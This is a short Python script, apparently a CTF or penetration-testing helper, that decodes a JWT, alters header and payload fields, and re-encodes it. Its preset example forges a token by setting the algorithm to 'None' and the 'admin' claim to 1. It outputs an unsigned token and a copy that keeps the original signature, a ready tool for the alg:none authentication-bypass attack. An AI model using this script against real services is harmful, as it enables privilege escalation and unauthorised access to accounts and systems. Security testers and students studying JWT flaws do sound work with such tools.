# script to switch out json values in unencrypted JWTs
# for example:
#   quickly change the value of admin from 0 to 1, or False to True, by decoding, swapping, and encoding back

# jwt payload: header.payload.signature
# each part is base64 encoded (URL safe AKA no "="-padding)

# header: {"alg":"HS256", "typ":"JWT"}
# payload: {"username": "user", "password": "pass123"}

import json
import base64

def b64_to_json(b64_string):
    # decode base64 string to JSON object
    padded_b64 = b64_string + "=" * (-len(b64_string) % 4)  # Fix padding issues
    try:
        decoded = base64.urlsafe_b64decode(padded_b64).decode("utf-8")
        return json.loads(decoded)
    except (json.JSONDecodeError, ValueError):
        return None

def is_json(data):
    # check if string is valid JSON
    try:
        json.loads(data)
    except ValueError as e:
        return False
    return True

def swapcrypt(token, header_changes, payload_changes):

    try:
        b64_header, b64_payload, b64_signature = token.split('.')
    except ValueError:
        raise ValueError("Invalid JWT format. Expected header.payload.signature")
    
    json_header  = b64_to_json(b64_header)
    json_payload = b64_to_json(b64_payload)

    if json_header is None or json_payload is None:
        print("Error: One of the token parts could not be decoded as JSON.")
        return None, None

    json_header.update(header_changes)
    json_payload.update(payload_changes)

    # encode back
    new_b64_header  = base64.urlsafe_b64encode(json.dumps(json_header, separators=(',', ':')).encode('utf-8')).decode().rstrip("=")
    new_b64_payload = base64.urlsafe_b64encode(json.dumps(json_payload, separators=(',', ':')).encode('utf-8')).decode().rstrip("=")

    modified_jwt = f"{new_b64_header}.{new_b64_payload}."
    modified_jwt_with_signature = f"{new_b64_header}.{new_b64_payload}.{b64_signature}"

    return modified_jwt, modified_jwt_with_signature

if __name__ == "__main__":
    # ADD TOKEN HERE
    token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4"

    # ADD CHANGES HERE
    header_changes = {} # use when changing nothing in the header
    header_changes = { "alg" : "None" }
    payload_changes = {} # use when changing nothing in the payload
    payload_changes = { "admin" : 1 }

    modified_jwt, modifed_jwt_with_signature = swapcrypt(token, header_changes=header_changes, payload_changes=payload_changes)

    #print("Original token: " + token)
    print("Modified token: " + modified_jwt)
    print("Modified token (with sign): " + modifed_jwt_with_signature)
